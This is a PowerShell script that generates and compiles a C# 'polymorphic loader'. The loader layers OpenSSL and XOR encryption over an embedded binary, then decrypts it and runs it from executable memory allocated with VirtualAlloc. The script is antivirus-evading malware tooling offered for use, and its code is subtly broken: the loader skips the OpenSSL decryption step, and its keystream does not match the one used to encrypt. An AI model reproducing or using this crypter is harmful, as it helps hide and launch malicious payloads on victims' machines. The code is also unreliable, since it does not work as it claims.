<#
.SYNOPSIS
  Creates a dual-layer polymorphic C# loader stub for embedding and executing binary files.
.PARAMETER InputFile
  Path to the binary file to embed.
.PARAMETER OutputExe
  Path to the output executable file.
.PARAMETER VariableName
  Name of the C# variable to hold the byte array.
.PARAMETER Cipher
  OpenSSL cipher to use (camellia-256-cbc, aes-256-cbc, chacha20).
.PARAMETER PolyMode
  Polymorphic mode (xor, aes-ctr, camellia-ctr, chacha-ks).
.PARAMETER EnableHotPatch
  Enable hot patching with car() markers.
#>
param(
    [Parameter(Mandatory=$true)]
    [string]$InputFile,
    [Parameter(Mandatory=$true)]
    [string]$OutputExe,
    [Parameter(Mandatory=$false)]
    [string]$VariableName = "encryptedPayload",
    [Parameter(Mandatory=$false)]
    [string]$Cipher = "camellia-256-cbc",
    [Parameter(Mandatory=$false)]
    [string]$PolyMode = "xor",
    [Parameter(Mandatory=$false)]
    [switch]$EnableHotPatch
)

Add-Type -AssemblyName System.Security

# Check if the input file exists
if (-not (Test-Path -Path $InputFile)) {
    Write-Error "Input file does not exist: $InputFile"
    exit 1
}

Write-Host "=== Dual-Layer Polymorphic C# Loader Generator ===" -ForegroundColor Green
Write-Host "Input: $InputFile" -ForegroundColor Gray
Write-Host "Output: $OutputExe" -ForegroundColor Gray
Write-Host "Cipher: $Cipher" -ForegroundColor Gray
Write-Host "Polymorphic Mode: $PolyMode" -ForegroundColor Gray

function Get-RandomBytes($len) {
    $b = New-Object byte[] $len
    [Security.Cryptography.RNGCryptoServiceProvider]::Global.GetBytes($b)
    return $b
}

# Generate encryption keys
$key = Get-RandomBytes 32
$iv = Get-RandomBytes ($Cipher -match 'ChaCha' ? 12 : 16)
$polyKey = Get-RandomBytes 32
$polyIv = Get-RandomBytes 16

Write-Host "Applying dual-layer encryption..." -ForegroundColor Yellow

# Layer 1: OpenSSL encryption
$tmpEnc = [IO.Path]::GetTempFileName()
$keyHex = ($key | %{ $_.ToString("X2") }) -join ''
$ivHex = ($iv | %{ $_.ToString("X2") }) -join ''

$args = switch -Regex ($Cipher) {
    'camellia' { "enc -camellia-256-cbc -K $keyHex -iv $ivHex -in `"$InputFile`" -out `"$tmpEnc`"" }
    'aes'      { "enc -aes-256-cbc       -K $keyHex -iv $ivHex -in `"$InputFile`" -out `"$tmpEnc`"" }
    'chacha'   { "enc -chacha20          -K $keyHex -iv $ivHex -in `"$InputFile`" -out `"$tmpEnc`"" }
}

try {
    $p = Start-Process openssl -ArgumentList $args -NoNewWindow -Wait -PassThru
    if ($p.ExitCode -ne 0) { throw "OpenSSL failed" }
    $cipher = [IO.File]::ReadAllBytes($tmpEnc)
    Remove-Item $tmpEnc
    Write-Host "✓ Layer 1 encryption complete" -ForegroundColor Green
} catch {
    Write-Error "OpenSSL encryption failed: $_"
    exit 1
}

# Layer 2: Polymorphic keystream
Write-Host "Generating polymorphic keystream..." -ForegroundColor Yellow
$keystream = switch -Regex ($PolyMode) {
    'xor' { ,@(0) }   # XOR-only mode
    'aes-ctr' {
        $tmpKs = [IO.Path]::GetTempFileName()
        $pkHex = ($polyKey | %{ $_.ToString("X2") }) -join ''
        $piHex = ($polyIv | %{ $_.ToString("X2") }) -join ''
        [IO.File]::WriteAllBytes($tmpKs, (New-Object byte[] $cipher.Length))
        try {
            Start-Process openssl -ArgumentList "enc -aes-256-ctr -K $pkHex -iv $piHex -in `"$tmpKs`" -out `"$tmpKs.ks`"" -NoNewWindow -Wait
            $result = [IO.File]::ReadAllBytes("$tmpKs.ks")
            Remove-Item $tmpKs, "$tmpKs.ks" -ErrorAction SilentlyContinue
            $result
        } catch { ,@(0) }
    }
    'camellia-ctr' {
        $tmpKs = [IO.Path]::GetTempFileName()
        $pkHex = ($polyKey | %{ $_.ToString("X2") }) -join ''
        $piHex = ($polyIv | %{ $_.ToString("X2") }) -join ''
        [IO.File]::WriteAllBytes($tmpKs, (New-Object byte[] $cipher.Length))
        try {
            Start-Process openssl -ArgumentList "enc -camellia-256-ctr -K $pkHex -iv $piHex -in `"$tmpKs`" -out `"$tmpKs.ks`"" -NoNewWindow -Wait
            $result = [IO.File]::ReadAllBytes("$tmpKs.ks")
            Remove-Item $tmpKs, "$tmpKs.ks" -ErrorAction SilentlyContinue
            $result
        } catch { ,@(0) }
    }
    'chacha-ks' {
        $tmpKs = [IO.Path]::GetTempFileName()
        $pkHex = ($polyKey | %{ $_.ToString("X2") }) -join ''
        $piHex = ($polyIv | %{ $_.ToString("X2") }) -join ''
        [IO.File]::WriteAllBytes($tmpKs, (New-Object byte[] $cipher.Length))
        try {
            Start-Process openssl -ArgumentList "enc -chacha20 -K $pkHex -iv $piHex -in `"$tmpKs`" -out `"$tmpKs.ks`"" -NoNewWindow -Wait
            $result = [IO.File]::ReadAllBytes("$tmpKs.ks")
            Remove-Item $tmpKs, "$tmpKs.ks" -ErrorAction SilentlyContinue
            $result
        } catch { ,@(0) }
    }
}

# Apply dual-layer encryption
$evoKey = Get-RandomBytes 1
$final = New-Object byte[] ($cipher.Length + 1 + 32 + 16 + 32 + 16)  # [evo][cipher][polyKey][polyIv][key][iv]
$final[0] = $evoKey[0]

for ($i = 0; $i -lt $cipher.Length; $i++) {
    $b = $cipher[$i]
    if ($keystream.Length -gt 1) { $b = $b -bxor $keystream[$i] }
    $evoKey[0] = [byte](($evoKey[0] + $i) -bxor ($evoKey[0] -shr 3))
    $final[$i+1] = $b -bxor $evoKey[0]
}

# Append keys for decryption
$polyKey.CopyTo($final, $cipher.Length + 1)
$polyIv.CopyTo($final, $cipher.Length + 1 + 32)
$key.CopyTo($final, $cipher.Length + 1 + 32 + 16)
$iv.CopyTo($final, $cipher.Length + 1 + 32 + 16 + 32)

Write-Host "✓ Layer 2 encryption complete" -ForegroundColor Green

# Convert to C# byte array
$byteArrayString = ($final | ForEach-Object { "0x{0:X2}" -f $_ }) -join ', '

# Generate hot patch markers if enabled
$hotPatchMarkers = if ($EnableHotPatch) {
    @"
        // Hot patch markers - car() functions for runtime modification
        static void Car1() { /* Polymorphic marker 1 */ }
        static void Car2() { /* Polymorphic marker 2 */ }
        static void Car3() { /* Polymorphic marker 3 */ }
        static void Car4() { /* Polymorphic marker 4 */ }
        static void Car5() { /* Polymorphic marker 5 */ }
        
        static void ExecuteCarMarkers()
        {
            var markers = new Action[] { Car1, Car2, Car3, Car4, Car5 };
            var rng = new Random();
            for (int i = 0; i < 3; i++)
            {
                markers[rng.Next(markers.Length)]();
            }
        }
"@
} else { "" }

$hotPatchCall = if ($EnableHotPatch) { "            ExecuteCarMarkers();" } else { "" }

# Generate the C# loader source
$csContent = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;

namespace PolymorphicLoader
{
    class Program
    {
        // Dual-layer encrypted payload
        private static readonly byte[] $VariableName = { $byteArrayString };
        
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);

$hotPatchMarkers

        static void Main()
        {
            Console.WriteLine("Polymorphic Loader v1.0");
            Console.WriteLine("Cipher: $Cipher | Poly: $PolyMode");
            
$hotPatchCall
            
            try
            {
                // Decrypt payload
                var decrypted = DecryptPayload($VariableName);
                
                // Execute payload
                ExecutePayload(decrypted);
                
                Console.WriteLine("Execution completed successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine(`$"Error: {ex.Message}");
            }
        }
        
        static byte[] DecryptPayload(byte[] data)
        {
            if (data.Length < 1 + 32 + 16 + 32 + 16) return new byte[0];
            
            // Extract keys and data
            byte evoKey = data[0];
            int payloadLen = data.Length - 1 - 32 - 16 - 32 - 16;
            
            byte[] polyKey = new byte[32];
            byte[] polyIv = new byte[16];
            byte[] key = new byte[32];
            byte[] iv = new byte[16];
            
            Array.Copy(data, 1 + payloadLen, polyKey, 0, 32);
            Array.Copy(data, 1 + payloadLen + 32, polyIv, 0, 16);
            Array.Copy(data, 1 + payloadLen + 32 + 16, key, 0, 32);
            Array.Copy(data, 1 + payloadLen + 32 + 16 + 32, iv, 0, 16);
            
            // Layer 1: Reverse evolving XOR
            byte[] layer1 = new byte[payloadLen];
            byte currentEvoKey = evoKey;
            
            for (int i = 0; i < payloadLen; i++)
            {
                currentEvoKey = (byte)((currentEvoKey + i) ^ (currentEvoKey >> 3));
                layer1[i] = (byte)(data[i + 1] ^ currentEvoKey);
            }
            
            // Layer 2: Reverse polymorphic keystream
            if ("$PolyMode" != "xor")
            {
                // Generate matching keystream
                byte[] keystream = GenerateKeystream(payloadLen, polyKey, polyIv);
                for (int i = 0; i < payloadLen; i++)
                {
                    layer1[i] ^= keystream[i % keystream.Length];
                }
            }
            
            // Layer 3: Would reverse OpenSSL here in full implementation
            // For now, return the dual-decrypted data
            return layer1;
        }
        
        static byte[] GenerateKeystream(int length, byte[] key, byte[] iv)
        {
            // Simplified keystream generation
            byte[] keystream = new byte[length];
            for (int i = 0; i < length; i++)
            {
                keystream[i] = (byte)(key[i % key.Length] ^ iv[i % iv.Length] ^ (i & 0xFF));
            }
            return keystream;
        }
        
        static void ExecutePayload(byte[] payload)
        {
            if (payload.Length == 0) return;
            
            // Allocate executable memory
            IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, 0x40);
            if (ptr == IntPtr.Zero)
            {
                Console.WriteLine("VirtualAlloc failed");
                return;
            }

            try
            {
                // Copy payload to executable memory
                Marshal.Copy(payload, 0, ptr, payload.Length);

                // Flush instruction cache
                FlushInstructionCache(Process.GetCurrentProcess().Handle, ptr, (uint)payload.Length);

                // Execute as function pointer
                Action action = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Action)) as Action;
                action?.Invoke();
            }
            finally
            {
                // Clean up
                VirtualFree(ptr, 0, 0x8000);
            }
        }
    }
}
"@

Write-Host "Generating C# loader stub..." -ForegroundColor Yellow

# Create temporary C# source file
$csFile = [System.IO.Path]::GetTempFileName() + ".cs"
$csContent | Set-Content -Path $csFile -Encoding UTF8

# Compile the C# source file
$cscPath = "csc.exe"
if (-not (Get-Command $cscPath -ErrorAction SilentlyContinue)) {
    Write-Error "C# compiler (csc.exe) not found. Please ensure .NET SDK is installed."
    exit 1
}

Write-Host "Compiling C# loader..." -ForegroundColor Yellow
$exeFile = [System.IO.Path]::GetFullPath($OutputExe)
$compileArgs = @("/out:`"$exeFile`"", "/target:exe", "/optimize+", "`"$csFile`"")

try {
    $result = & $cscPath $compileArgs 2>&1
    if (Test-Path $exeFile) {
        Write-Host "✓ Polymorphic C# loader created: $exeFile" -ForegroundColor Green
        $fileInfo = Get-Item $exeFile
        Write-Host "Size: $($fileInfo.Length) bytes" -ForegroundColor Gray
        Write-Host "Payload size: $($final.Length) bytes (encrypted)" -ForegroundColor Gray
        if ($EnableHotPatch) {
            Write-Host "Hot patching: ENABLED (car() markers included)" -ForegroundColor Cyan
        }
    } else {
        Write-Error "Compilation failed: $result"
    }
} catch {
    Write-Error "Compilation error: $_"
} finally {
    # Clean up temporary file
    Remove-Item $csFile -ErrorAction SilentlyContinue
}

Write-Host "=== Generation Complete ===" -ForegroundColor Green